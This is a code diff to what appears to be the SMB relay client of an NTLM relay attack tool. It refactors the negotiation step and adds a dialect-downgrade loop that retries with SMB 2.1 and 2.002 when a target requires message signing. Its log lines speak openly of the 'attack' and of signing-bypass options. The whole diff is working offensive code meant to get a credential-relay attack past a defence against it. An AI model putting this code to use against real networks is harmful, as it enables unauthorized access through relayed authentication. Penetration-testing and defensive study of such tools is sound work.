@@ -62,6 +62,7 @@ class MYSMB3(SMB3):
     def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None, preferredDialect=None, allowSigning=False):
         self.extendedSecurity = extendedSecurity
         self.allowSigning = allowSigning
+        self.signingRequired = False
         SMB3.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negSessionResponse=SMB2Packet(negPacket), preferredDialect=preferredDialect)
 
     def negotiateSession(self, preferredDialect = None, negSessionResponse = None):
@@ -72,7 +73,7 @@ class MYSMB3(SMB3):
             self._Connection['ClientSecurityMode'] = 0
 
         if self.RequireMessageSigning is True:
-            LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic')
+            self.signingRequired = True
             return
 
         self._Connection['Capabilities'] = SMB2_GLOBAL_CAP_ENCRYPTION
@@ -113,7 +114,7 @@ class MYSMB3(SMB3):
         self._Connection['GSSNegotiateToken'] = negResp['Buffer']
         self._Connection['Dialect']           = negResp['DialectRevision']
         if (negResp['SecurityMode'] & SMB2_NEGOTIATE_SIGNING_REQUIRED) == SMB2_NEGOTIATE_SIGNING_REQUIRED and self.allowSigning is False:
-            LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic')
+            self.signingRequired = True
             return
         if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LEASING) == SMB2_GLOBAL_CAP_LEASING:
             self._Connection['SupportsFileLeasing'] = True
@@ -270,9 +271,20 @@ class SMBRelayClient(ProtocolClient):
             self.session.close()
             self.session = None
 
+    def _negotiate_smb_connection(self, flags2, data, preferredDialect=None):
+        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port=self.targetPort, manualNegotiate=True)
+        packet = self.session.negotiateSessionWildcard(None, self.targetHost, self.targetHost, self.targetPort, 60, self.extendedSecurity,
+                                              flags1=SMB.FLAGS1_PATHCASELESS | SMB.FLAGS1_CANONICALIZED_PATHS,
+                         flags2=flags2, data=data)
+        if packet[0:1] == b'\xfe':
+            smbClient = MYSMB3(self.targetHost, self.targetPort, self.extendedSecurity, nmbSession=self.session.getNMBServer(),
+                               negPacket=packet, preferredDialect=preferredDialect,
+                               allowSigning=self.serverConfig.reauth_bypass)
+            return smbClient, True
+        else:
+            return packet, False
+
     def initConnection(self):
-        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port= self.targetPort, manualNegotiate=True)
-                                     #,preferredDialect=SMB_DIALECT)
         if self.serverConfig.smb2support is True:
             data = '\x02NT LM 0.12\x00\x02SMB 2.002\x00\x02SMB 2.???\x00'
         else:
@@ -283,32 +295,49 @@ class SMBRelayClient(ProtocolClient):
         else:
             flags2 = SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
         try:
-            packet = self.session.negotiateSessionWildcard(None, self.targetHost, self.targetHost, self.targetPort, 60, self.extendedSecurity,
-                                                  flags1=SMB.FLAGS1_PATHCASELESS | SMB.FLAGS1_CANONICALIZED_PATHS,
-                             flags2=flags2, data=data)
+            preferredDialect = None
+            if self.serverConfig.remove_target:
+                preferredDialect = SMB2_DIALECT_21
+            result, isSMB2 = self._negotiate_smb_connection(flags2, data, preferredDialect)
         except Exception as e:
             if not self.serverConfig.smb2support:
                 LOG.error('SMBClient error: Connection was reset. Possibly the target has SMBv1 disabled. Try running ntlmrelayx with -smb2support')
             else:
                 LOG.error('SMBClient error: Connection was reset')
             return False
-        if packet[0:1] == b'\xfe':
-            preferredDialect = None
-            # Currently only works with SMB2_DIALECT_002 or SMB2_DIALECT_21
-            if self.serverConfig.remove_target:
-                preferredDialect = SMB2_DIALECT_21
-            smbClient = MYSMB3(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(),
-                               negPacket=packet, preferredDialect=preferredDialect,
-                               allowSigning=self.serverConfig.reauth_bypass)
+
+        if isSMB2:
+            smbClient = result
+            if smbClient.signingRequired and preferredDialect is None and not self.serverConfig.reauth_bypass:
+                negotiated_dialect = smbClient._Connection.get('Dialect', 0)
+                fallback_dialects = [d for d in [SMB2_DIALECT_21, SMB2_DIALECT_002] if d < negotiated_dialect]
+
+                for dialect in fallback_dialects:
+                    LOG.info("SMB signing required with dialect 0x%04x on target %s, retrying with dialect 0x%04x" %
+                             (negotiated_dialect, self.targetHost, dialect))
+                    try:
+                        result, isSMB2 = self._negotiate_smb_connection(flags2, data, preferredDialect=dialect)
+                        if isSMB2 and not result.signingRequired:
+                            smbClient = result
+                            LOG.info("Successfully negotiated SMB dialect 0x%04x without signing on %s" %
+                                     (dialect, self.targetHost))
+                            break
+                    except Exception as e:
+                        LOG.debug("Dialect fallback 0x%04x failed on %s: %s" % (dialect, self.targetHost, str(e)))
+                        continue
+                else:
+                    LOG.error('Signing is required on all SMB dialects for target %s, '
+                              'attack won\'t work unless using -remove-target / --remove-mic' % self.targetHost)
+                    return False
         else:
+            packet = result
             if self.serverConfig.reauth_bypass:
                 LOG.error('The SMB signing bypass needs SMB2 or later, but the target negotiated SMBv1')
                 return False
-            # Answer is SMB packet, sticking to SMBv1
-            smbClient = MYSMB(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(),
+            smbClient = MYSMB(self.targetHost, self.targetPort, self.extendedSecurity, nmbSession=self.session.getNMBServer(),
                               negPacket=packet)
 
-        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port= self.targetPort,
+        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port=self.targetPort,
                                      existingConnection=smbClient, manualNegotiate=True)
 
         if self.serverConfig.reauth_bypass:
